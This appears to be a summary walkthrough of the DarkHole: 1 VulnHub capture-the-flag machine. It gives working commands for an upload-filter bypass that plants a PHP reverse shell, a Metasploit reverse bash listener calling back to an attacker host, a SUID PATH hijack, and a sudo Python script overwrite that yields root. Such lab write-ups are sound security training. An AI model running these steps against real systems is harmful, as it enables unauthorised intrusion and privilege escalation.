# 🌑 DarkHole: 1 CTF – Summary Walkthrough

A text-based walkthrough of the **DarkHole: 1** vulnerable machine from VulnHub. This box highlights **insecure file uploads**, **IDOR flaws**, **SUID abuse**, and **Python script privilege escalation**.

## 🔍 Discovery
- Ran Nmap:
nmap -sV -Pn <ip>

Open ports:
- 22 (SSH)
- 80 (HTTP)

## 📂 Enumeration
- Ran Gobuster:
gobuster dir -u http://<ip>/ -w /usr/share/wordlists/dirb/common.txt -x .txt,.log,.php,.html

- Found:
- `/login.php`
- `/logout.php`
- `/dashboard.php`
- `/register.php`
- `/upload`
- Found **IDOR vulnerability** in change password → Logged in as `admin`.

## ⚙️ Foothold
- Used Pentest Monkey reverse PHP shell:
- Renamed `.php` → `.jpg`
- Intercepted upload request with Burp → changed to `.phtml`
- Uploaded successfully to `/upload/shell.phtml`
- Set up listener:
use exploit/multi/handler
set payload cmd/unix/reverse_bash
set LHOST <attacker-ip>
set LPORT <port>
run

- Triggered upload → Reverse shell as `www-data`
- Upgraded shell:
sessions
sessions -u 1

## 💻 User Escalation
- Found SUID binary `toto`:
./toto

Output suggests it runs `system("id")`.
- Created fake `id` binary:
echo '/bin/bash' > /tmp/id
chmod +x /tmp/id
export PATH=/tmp:$PATH
./toto

- Horizontal privilege escalation → User `john`

## 🔐 Privilege Escalation
- Found `/home/john/password` → `root123`
- Checked sudo:
sudo -l
(root) /usr/bin/python3 /home/john/file.py

- Overwrote script and executed:
echo 'import os; os.system("/bin/bash")' > /home/john/file.py
sudo /usr/bin/python3 /home/john/file.py

- Root shell obtained

---

📖 **Full walkthrough with screenshots:**  
👉 [View the Medium post here](https://medium.com/@basitolasubomibalogun/darkhole1-vulnhub-ctf-full-technical-walkthrough-283ad8c633ad)
